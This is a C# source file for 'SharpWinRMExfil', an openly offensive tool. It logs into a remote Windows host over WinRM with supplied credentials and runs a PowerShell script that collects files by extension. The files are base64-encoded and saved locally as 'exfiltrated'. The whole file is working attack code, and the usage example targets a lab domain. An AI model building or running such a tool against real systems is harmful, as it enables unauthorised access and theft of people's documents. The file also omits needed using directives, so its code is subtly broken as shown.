using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;

namespace SharpWinRMExfil
{
    class Program
    {
        static void Main(string[] args)
        {
            PrintBanner();
            if (args.Length < 6 || args.Contains("-h") || args.Contains("--help"))
            {
                ShowUsage();
                return;
            }

            string remoteComputerName = args[0];
            string remoteUser = args[1];
            string remotePassword = args[2];
            string remoteDirectory = args[3];
            string localDirectory = args[4];
            string[] extensions = args[5].Split(',');

            RetrieveFiles(remoteComputerName, remoteUser, remotePassword, remoteDirectory, localDirectory, extensions);
        }

        static void ShowUsage()
        {
            Console.WriteLine("Usage: SharpWinRMExfil.exe <remoteComputerName> <remoteUser> <remotePassword> <remoteDirectory> <localDirectory> <extensions>");
            Console.WriteLine("Example: SharpWinRMExfil.exe 192.168.56.11 north.sevenkingdoms.local\\testuser test123 \"C:\\Users\\testuser\\Documents\" \"C:\\Users\\win10sec\\Documents\\Exfiltrated\" \".txt,.docx,.pdf\"");
            Console.WriteLine("<extensions> should be comma-separated without spaces, e.g., .txt,.docx,.pdf");
        }

        static void PrintBanner()
        {
            string banner = @"
             _    _ _                      _____      __ _ _ 
            | |  | (_)                    |  ___|    / _(_) |
            | |  | |_ _ __  _ __ _ __ ___ | |____  _| |_ _| |
            | |/\| | | '_ \| '__| '_ ` _ \|  __\ \/ /  _| | |
            \  /\  / | | | | |  | | | | | | |___>  <| | | | |
             \/  \/|_|_| |_|_|  |_| |_| |_\____/_/\_\_| |_|_|
                                                                                         
        ";
            
            Console.WriteLine(banner);
            Console.WriteLine("Coded By: @gokupwn");
            Console.WriteLine("");

        }

        static void RetrieveFiles(string host, string user, string password, string remoteDir, string localDir, string[] extensions)
        {
            var securePassword = new System.Security.SecureString();
            foreach (char c in password)
            {
                securePassword.AppendChar(c);
            }
            securePassword.MakeReadOnly();

            WSManConnectionInfo connectionInfo = new WSManConnectionInfo()
            {
                ComputerName = host,
                Port = 5985, // Or 5986 for HTTPS
                Scheme = "http",
                AuthenticationMechanism = AuthenticationMechanism.Default,
                Credential = new PSCredential(user, securePassword)
            };

            string extensionFilter = string.Join("|", extensions.Select(ext => $@"\{ext}"));

            // Execute the command remotely
            using (Runspace runspace = RunspaceFactory.CreateRunspace(connectionInfo))
            {
                runspace.Open();
                using (PowerShell ps = PowerShell.Create())
                {
                    ps.Runspace = runspace;

                    // Retrieve file contents from the remote directory
                    string script = $@"
                        Get-ChildItem -Path '{remoteDir}' -File | Where-Object {{ $_.Extension -match '({extensionFilter})' }} | ForEach-Object {{
                            $content = [System.IO.File]::ReadAllBytes($_.FullName)
                            [PSCustomObject]@{{
                                FileName = $_.Name
                                Content = [Convert]::ToBase64String($content)
                            }}
                        }}
                    ";

                    ps.AddScript(script);
                    var results = ps.Invoke();

                    // Write the content locally
                    foreach (PSObject result in results)
                    {
                        string fileName = result.Members["FileName"].Value.ToString();
                        string base64Content = result.Members["Content"].Value.ToString();
                        byte[] content = Convert.FromBase64String(base64Content);

                        // Get the local file path and save the file
                        string localFilePath = Path.Combine(localDir, fileName);
                        File.WriteAllBytes(localFilePath, content);
                        Console.WriteLine($"[+=>]Exfiltrated File Saved To {localFilePath}");
                    }

                    if (ps.Streams.Error.Count > 0)
                    {
                        Console.WriteLine("Errors occurred while transferring files:");
                        foreach (var error in ps.Streams.Error)
                        {
                            Console.WriteLine(error.ToString());
                        }
                    }
                    else
                    {
                        Console.WriteLine("[+] All files have been exfiltrated");
                    }
                }
                runspace.Close();
            }
        }



    }
}
